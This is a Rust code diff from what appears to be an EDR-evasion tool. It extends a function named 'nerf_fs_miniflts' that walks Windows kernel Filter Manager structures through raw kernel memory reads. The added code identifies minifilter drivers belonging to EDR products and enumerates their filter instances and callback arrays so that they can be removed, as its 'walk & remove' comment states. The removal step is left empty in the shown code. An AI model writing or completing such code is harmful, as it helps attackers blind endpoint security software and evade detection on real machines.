@@ -184,7 +184,7 @@ pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core:
         let mut current_filter_shifted = mem::read_qword(filter_list_header)?;
         
         while current_filter_shifted != filter_list_header {
-            println!("[|]     - Current filter: 0x{:16x}", current_filter_shifted);
+            //println!("[|]     Current filter: 0x{:16x}", current_filter_shifted);
             current_filter_shifted = mem::read_qword(current_filter_shifted)?;
             let current_filter = current_filter_shifted - offsets.flt_object_primarylink;
 
@@ -196,14 +196,39 @@ pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core:
             match km::find_driver_name_from_addr(driver_init) {
                 Some(drv) => {
                     drv_name = drv; // take ownership of the String
-                    println!("[|]       EDR driver found: {}", drv_name);
                 },
                 None => {
                     drv_name = String::from(""); // fallback
                 }
             }
+            
+            // If it matches an EDR, walk & remove
+            if km::is_driver_name_matching_edr(&drv_name) {
+                println!("[|]     - [0x{:16x}] Current _FLT_FILTER matches EDR: {}. Walking...", driver_init, drv_name);
+                let instance_list_header = current_filter 
+                    + offsets.flt_filter_instancelist 
+                    + offsets.flt_resource_list_head_rlist;
+                
+                let mut current_instance_shifted = mem::read_qword(instance_list_header)?;
+                while current_instance_shifted != instance_list_header {
+                    let current_instance = current_instance_shifted - offsets.flt_instance_filterlink;
+                    let cb_nodes_array = current_instance + offsets.flt_instance_callbacknodes;
+                    println!("[|]       - [{}] _FLT_INSTANCE 0x{:16x} with callbacks at: 0x{:16x}", 
+                        drv_name, current_instance, cb_nodes_array
+                    );
+
+                    // Get the next one before the loop check
+                    current_instance_shifted = mem::read_qword(current_instance_shifted)?;
+                }
+                
+
+
+
+            }
+
         }
         
+        // Get the next one before the loop check
         current_frame_shifted = mem::read_qword(current_frame_shifted)?;
     }
 
